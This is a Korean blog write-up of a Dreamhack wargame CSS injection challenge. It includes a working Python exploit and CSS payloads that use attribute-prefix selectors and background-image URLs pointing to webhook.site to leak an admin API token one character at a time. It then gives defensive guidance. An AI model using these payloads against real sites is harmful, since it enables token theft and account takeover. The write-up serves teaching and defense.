---
layout: post
title:  "Dreamhack 워게임 CSS Injection 풀이 — JS 없이 CSS 만으로 admin API 토큰 한 글자씩 훔치기"
date:   2026-05-15 05:30:00 +0900
categories: security web wargame dreamhack writeup css exfiltration
---

## 들어가며

Dreamhack 웹해킹 워게임 **CSS Injection** (난이도 Gold 4) 풀이입니다. "CSS만으로 데이터를 빼낸다" 는 다소 비현실적인 클래스를 손에 잡히게 보여주는 교과서 같은 문제입니다.

문제 설명은 "Exercise: CSS Injection에서 실습하는 문제" 한 줄이 전부지만, 코드를 따라가다 보면 다음과 같은 그림이 보입니다.

- **`<style>` 블록 안에 사용자 입력(`color` 쿼리)이 그대로 박힘** → CSS 룰 임의 삽입 가능
- **봇이 admin 으로 로그인한 뒤 우리가 지정한 URL을 방문** → 우리가 짠 CSS 가 admin 의 페이지에서 실행됨
- **`/mypage` 의 `<input id="InputApitoken" value="...">`** 에 API 토큰이 그대로 노출
- **CSS attribute prefix 선택자(`[value^="ab"]`)** 로 토큰 첫 N글자를 1글자씩 좁혀가며 webhook 으로 누설

JavaScript 한 줄 안 쓰고, CSS의 `background-image: url(...)` 한 가지 기능만으로 8글자 토큰을 1초당 1글자씩 깨끗하게 빼냅니다. 그 토큰으로 `/api/memo` 호출 → admin의 memo에 박혀있는 FLAG 획득.

> 최종 flag: `DH{a036f98c93acba0a04657ec6a6080d0a771a3d24}`

> Note: 본 글은 워게임 학습용 PoC 입니다. 익스플로잇 코드는 의도된 풀이의 재현이고, 실제 운영 서비스 대상 사용은 금지됩니다.

## 1. 소스의 핵심 4가지

### 1-1. CSS 인젝션 포인트 — `base.html`

```html
<style>
  body{
    background-color: {{ color }};
  }
</style>
```

`{{ color }}` 는 `main.py`의 `context_processor` 에서 옵니다:

```python
@app.context_processor
def background_color():
    color = request.args.get("color", "white")
    return dict(color=color)
```

Jinja autoescape 가 적용되지만 `<` `>` `&` `'` `"` 정도만 escape 합니다. CSS 의 메타문자인 **`{`, `}`, `:`, `;`** 는 그대로 통과. 즉 **CSS 룰을 임의로 삽입할 수 있습니다.**

페이로드 예시:

```
?color=red;}TEST_RULE{
```

→ 응답:

```css
body{
  background-color: red;}TEST_RULE{;
}
```

`body{...}` 를 조기 닫고 새로운 룰 `TEST_RULE{...` 을 시작했습니다. 끝에 `body{` 를 다시 열어줘서 트레일링 `}` 가 짝이 맞도록 정리하면 완전한 CSS 가 됩니다.

### 1-2. 봇 — admin 으로 로그인한 뒤 우리 URL 방문

```python
@app.route("/report", methods=["GET", "POST"])
def report():
    ...
    path = request.form.get("path")
    if path and path[0] == "/":
        path = path[1:]
    url = f"http://127.0.0.1:8000/{path}"
    if check_url(url): flash("success.")
    ...

def check_url(url):
    ...
    driver.get("http://127.0.0.1:8000/login")
    driver.find_element(By.NAME, "username").send_keys(str(ADMIN_USERNAME))
    driver.find_element(By.NAME, "password").send_keys(ADMIN_PASSWORD.decode())
    driver.find_element(By.ID, "submit").click()
    sleep(0.1)
    driver.get(url)
```

봇은 헤드리스 Chrome 으로 **admin 으로 로그인 → 우리가 지정한 URL 방문**. 우리가 `path=mypage?color=<악성CSS>` 을 보내면, 봇이 admin 세션으로 `/mypage` 를 방문하면서 우리의 CSS가 실행됩니다.

### 1-3. 토큰 노출 — `mypage.html`

```html
<div class="form-group">
  <label for="InputApitoken">API Token</label>
  <input type="text" class="form-control" id="InputApitoken" readonly value="{{ user[3] }}">
</div>
```

API 토큰이 **`value=` HTML 속성** 으로 노출됩니다. CSS attribute selector 의 좋은 먹잇감.

토큰 생성기는:

```python
def token_generate():
    while True:
        token = "".join(random.choice(string.ascii_lowercase) for _ in range(8))
        ...
```

**8글자 소문자 알파벳** → 한 자리당 26개 후보.

### 1-4. 토큰 사용처 — `apikey_required`

```python
def apikey_required(view):
    @wraps(view)
    def wrapped_view(**kwargs):
        apikey = request.headers.get("API-KEY", None)
        token = execute("SELECT * FROM users WHERE token = :token;", {"token": apikey})
        if token:
            request.uid = token[0][0]
            return view(**kwargs)
        return {"code": 401, "message": "Access Denined !"}
    return wrapped_view

@app.route("/api/memo")
@apikey_required
def APImemo():
    memos = execute("SELECT * FROM memo WHERE uid = :uid;", {"uid": request.uid})
    ...
```

`API-KEY` 헤더로 토큰만 알면 그 사용자의 memo 를 읽을 수 있고, **FLAG 는 init() 에서 admin 의 memo 로 저장되어 있습니다**.

```python
execute(
    "INSERT INTO memo (uid, text)" "VALUES (:uid, :text);",
    {"uid": adminUid[0][0], "text": "FLAG is " + FLAG},
)
```

이 4가지를 묶으면 **공격 시나리오**가 완성됩니다.

## 2. 공격 전략 — CSS Attribute-Prefix Exfiltration

### 2-1. 핵심 트릭

CSS3 attribute selector `[value^="abc"]` 는 "value 가 abc 로 시작하는 요소" 를 매칭합니다. 그 매칭된 요소에 `background-image: url(...)` 을 걸어두면 브라우저는 **그 URL 로 GET 요청** 을 보냅니다. 즉:

```css
input[id=InputApitoken][value^=ab] {
    background-image: url(https://webhook.site/UUID/leak/ab);
}
```

`value` 의 첫 2글자가 `ab` 라면 webhook 에 `/leak/ab` 가 도착. 그렇지 않으면 아무 일도 안 일어납니다. **이게 1비트의 정보 채널** — "value 가 prefix X 로 시작하는지" 의 yes/no.

26개 알파벳 × N 라운드를 돌리면 길이 N 의 prefix를 1글자씩 확장하며 토큰을 복원할 수 있습니다.

### 2-2. 한 라운드 페이로드

이미 알아낸 prefix가 `oh` 라면, 다음 글자 후보 26개 모두에 대한 selector 를 한 번의 CSS 안에 묶어 보냅니다.

```css
red;}
input[id=InputApitoken][value^=oha]{background-image:url(https://.../leak/oha)}
input[id=InputApitoken][value^=ohb]{background-image:url(https://.../leak/ohb)}
...
input[id=InputApitoken][value^=ohz]{background-image:url(https://.../leak/ohz)}
body{background-color:red
```

봇이 `/mypage` 를 열면 26개 중 정확히 **1개의 selector 만 매칭**됩니다 (실제 토큰의 3번째 글자에 해당). 그 selector 의 url 요청이 webhook 에 떨어지면서 3번째 글자가 폭로됩니다.

> 26개를 한 번에 보내는 이유: 매 라운드 봇이 한 번만 페이지를 열어도 모든 후보가 동시에 평가되므로, 라운드 횟수 = 토큰 길이 (8회) 로 끝낼 수 있습니다.

### 2-3. 페이로드 크기

26개 룰 × 한 룰당 ~95 bytes ≈ 2.5KB. URL encoding 후 ~7KB. Flask 의 기본 URL 길이 제한(8KB)을 거의 못 넘기지만, 우리는 `POST /report` 의 form 본문으로 보내기 때문에 사실상 제한 없음.

## 3. 익스플로잇 코드

```python
import urllib.parse, urllib.request, time, re, json

SERVER = "http://<host>:<port>"
WEBHOOK = "https://webhook.site/<UUID>"
WEBHOOK_TOKEN = "<UUID>"
chars = "abcdefghijklmnopqrstuvwxyz"

def webhook_total():
    r = urllib.request.urlopen(f'https://webhook.site/token/{WEBHOOK_TOKEN}/requests?per_page=1', timeout=10)
    return json.loads(r.read())['total']

def webhook_recent_urls(n):
    r = urllib.request.urlopen(f'https://webhook.site/token/{WEBHOOK_TOKEN}/requests?sorting=newest&page=1&per_page={n}', timeout=10)
    return [req['url'] for req in json.loads(r.read())['data']]

def exfil_char(known_prefix):
    rules = [
        f'input[id=InputApitoken][value^={known_prefix+c}]'
        f'{{background-image:url({WEBHOOK}/leak/{known_prefix+c})}}'
        for c in chars
    ]
    payload_css = "red;} " + " ".join(rules) + " body{background-color:red"
    path = "mypage?color=" + urllib.parse.quote(payload_css, safe='')

    before = webhook_total()
    urllib.request.urlopen(
        urllib.request.Request(
            f'{SERVER}/report',
            data=urllib.parse.urlencode({'path': path}).encode(),
            method='POST'),
        timeout=15)

    # 봇이 페이지를 열 때까지 폴링
    for _ in range(15):
        time.sleep(1)
        after = webhook_total()
        if after > before:
            break
    else:
        return None

    # 새 URL 중 우리가 보낸 prefix+1글자와 매치되는 걸 찾는다
    for u in webhook_recent_urls(after - before + 3):
        m = re.search(r'/leak/([a-z]+)', u)
        if m and m.group(1).startswith(known_prefix) and len(m.group(1)) == len(known_prefix)+1:
            return m.group(1)[-1]
    return None

# 8글자 토큰 복원
token = ""
for i in range(8):
    c = exfil_char(token)
    token += c
    print(f'Position {i+1}: {token}')

# 토큰으로 admin 의 memo (= FLAG) 읽기
req = urllib.request.Request(f'{SERVER}/api/memo', headers={'API-KEY': token})
print(urllib.request.urlopen(req).read().decode())
```

실행 결과:

```
Position 1: o
Position 2: oh
Position 3: ohd
Position 4: ohdl
Position 5: ohdlo
Position 6: ohdlod
Position 7: ohdlodt
Position 8: ohdlodtr

{"code":200,"memo":[{"idx":1,"memo":"FLAG is DH{a036f98c93acba0a04657ec6a6080d0a771a3d24}"}]}
```

## 4. 취약점 해설 — Style-Context Sink + Same-Origin Bot

이 클래스의 본질은 다음 두 조건의 합입니다.

> 1. **사용자 입력이 `<style>` 안에 raw 로 박힌다** (= CSS rule injection).
> 2. **공격자가 피해자(예: 권한이 높은 봇/관리자) 의 브라우저로 임의 URL을 열게 만들 수 있다** (= same-origin 봇 또는 CSRF 비스무리한 채널).

이 두 조건이 만나면 **JS 한 줄 없이도 데이터 누설**이 가능합니다. 매우 흥미로운 점은 CSP 의 `script-src 'none'` 같은 강력한 정책으로도 막을 수 없다는 점 — CSS는 다른 directive(`style-src`, `img-src`) 에 묶여 있어서 별도의 강화가 필요합니다.

### 4-1. 위험성

- JS 없이도 동작하므로 **CSP 강화로 JS 만 막은 사이트는 여전히 취약**.
- `background-image` 외에 `cursor: url(...)`, `list-style-image: url(...)`, `@font-face { src: url(...) }`, `mask-image: url(...)` 등 **CSS 가 외부 자원을 로드하는 모든 속성** 이 채널이 될 수 있음.
- 길이 N 짜리 토큰의 누설 비용은 **O(N × |alphabet|) selector** 면 충분. 8글자 소문자는 26 × 8 = 208 selectors / 1KB 정도면 가능. 16자 hex 토큰도 16 × 16 = 256 selectors 로 가볍게 추출.
- HttpOnly 쿠키도 직접 못 읽지만, 폼 값/속성에 cookie 가 leak 돼 있으면 결국 같은 운명.

### 4-2. 올바른 방어

1. **사용자 입력을 `<style>` 안에 절대 박지 말 것.** 동적 색상은 `style="..."` 인라인 속성도 위험. 차라리 미리 정의된 클래스를 toggle:

   ```html
   <body class="theme-{{ theme|escape_class }}">
   ```

   백엔드에서 `theme` 을 정해진 화이트리스트로만 매핑.

2. **꼭 동적 CSS 가 필요하면 strict whitelist + 정규식**.

   ```python
   COLORS = {'red', 'blue', 'green', 'white', 'black'}
   color = request.args.get("color", "white")
   if color not in COLORS:
       color = "white"
   ```

3. **CSP `style-src` 강화** — `unsafe-inline` 금지, nonce 기반.

   ```
   Content-Security-Policy: default-src 'self'; style-src 'self' 'nonce-XYZ'
   ```

   인라인 `<style>` 자체를 못 만들면 인젝션 표면 자체가 사라집니다.

4. **민감 정보를 HTML 속성에 노출하지 말 것.** API 토큰, 세션 ID 등은 `value=`/`data-*=` 같은 attribute 로 박지 말고, 서버 사이드에서만 다루거나 별도 페이지에서 받아오게 합니다. 부득이하게 박아야 한다면 `:has()`/`[value^=]` 같은 selector 가 매칭되어도 무해한 마스킹된 값으로.

5. **봇이 same-origin 으로 사용자 페이지를 여는 패턴 자체를 의심.** report 류 봇은 `Referer` 검사, URL allowlist, 시간/횟수 제한, 자바스크립트 비활성 모드 등으로 표면을 최소화.

## 5. 정리 — 입문자가 가져갈 교훈

- **CSS 도 데이터 누설 채널** 이다. `<style>` 안에 사용자 입력이 박히는 모든 곳을 의심하자.
- `[attr^=]`, `[attr*=]`, `[attr$=]` 같은 속성 selector + `background-image: url(...)` 한 줄이면 8글자 정도는 8초에 빼낼 수 있다.
- **봇/관리자가 우리가 만든 URL 을 same-origin 으로 방문하는 모든 자동화** 는 CSS 인젝션 + 정보 누설의 가장 흔한 결합점.
- 방어 시 CSP 의 `script-src` 만 강화하는 것은 부족하다. `style-src` 도 함께 강화해야 한다. 그리고 **민감 정보는 HTML 속성으로 노출하지 말 것**.
- 토큰/시크릿이 짧을수록 위험. 8글자 / 26알파벳 = 약 11비트 엔트로피이지만, prefix selector 가 1비트씩 깎아내므로 사실상 11라운드 안에 종결.

다음 단계로 **CSS Injection Advanced**, **font-face based exfil**, **`@import` chain attack**, **CSS keyframe + multi-stage exfil** 같은 변형을 풀어 보면 좋습니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. `'` `"` 이스케이프를 잘못 잡고 시작

처음에 selector 를 `[value^='ab']` 처럼 작은따옴표로 쓰려고 했습니다. 그런데 Jinja autoescape 가 `'` 를 `&#39;` 로 escape 하면 CSS selector 가 깨집니다.

**회고**: CSS attribute selector 는 **값이 valid CSS identifier 일 때 따옴표를 생략** 할 수 있습니다 (`[value^=abc]`). 8글자 소문자 prefix 는 항상 valid identifier 라 그냥 따옴표 없이 쓰면 깔끔하게 통과. autoescape 문제를 피하는 가장 쉬운 방법.

### 실패 2. 첫 라운드 URL 매칭 정규식이 잘못

처음에 `re.search(r'/leak/(\w+)', u)` 로 잡으려고 했는데, `\w` 가 `_` 도 매칭해서 prefix 외 다른 path 일부까지 잡혔습니다. 결국 `[a-z]+` 로 명시.

**회고**: webhook URL 에 cosmetic 인자(예: 이전 테스트의 `?c=...`) 가 섞일 수 있으니, **단순 grep 보다는 prefix 길이와 시작 prefix 까지 정확히 검증** 하는 게 안전합니다. 코드에 `m.group(1).startswith(known_prefix) and len(m.group(1)) == len(known_prefix)+1` 두 조건을 둠.

### 실패 3. webhook API endpoint 헷갈림

처음에 `/token/UUID/request/count` 같은 (없는) 엔드포인트로 카운트를 가져오려다 404. 실제로는 `/token/UUID/requests?per_page=1` 응답의 `total` 필드를 쓰면 됩니다.

**회고**: 처음 사용하는 서비스의 API 는 5초 짜리 curl 한 번으로 응답 스키마를 확인하고 시작하자. `curl URL | jq` 가 가장 가성비 좋다.

### 실패 4. autoescape 의 정확한 동작을 잠시 의심

`{{ color }}` 가 raw HTML 컨텍스트가 아니라 `<style>` 안이라서 autoescape 가 적용되는지 잠깐 헷갈렸습니다. 결국 Jinja 의 autoescape 는 **출력 위치를 모르고** 무조건 HTML escape 만 합니다(즉 `<` `>` `&` `'` `"` 만). CSS 메타문자(`{`, `}`, `:`, `;`)는 통과.

**회고**: Jinja(또는 다른 템플릿엔진)의 autoescape 는 **HTML 문자만 escape**, CSS/JS/URL 컨텍스트는 신경 안 씀. 같은 입력을 다른 컨텍스트에 박을 때마다 별도로 정규화해야 한다. `tojson` 필터(JS 컨텍스트) 같은 도구를 컨텍스트별로 익혀두자.

### 실패 5. 봇 응답 대기 시간

봇이 페이지를 열고 CSS 가 평가되어 webhook 에 도착하기까지 약 1~3초. 처음에 sleep(1) 만 줬다가 종종 놓쳐서 결국 **최대 15초까지 1초 간격 폴링** 으로 변경. 보다 안정적.

**회고**: 봇이 매개한 익스플로잇은 항상 **타임아웃을 넉넉히 두고 폴링** 하는 게 좋다. 봇 실행 + 페이지 로드 + CSS 평가 + webhook 도착 의 총합이 1초를 넘기는 경우가 흔하다.
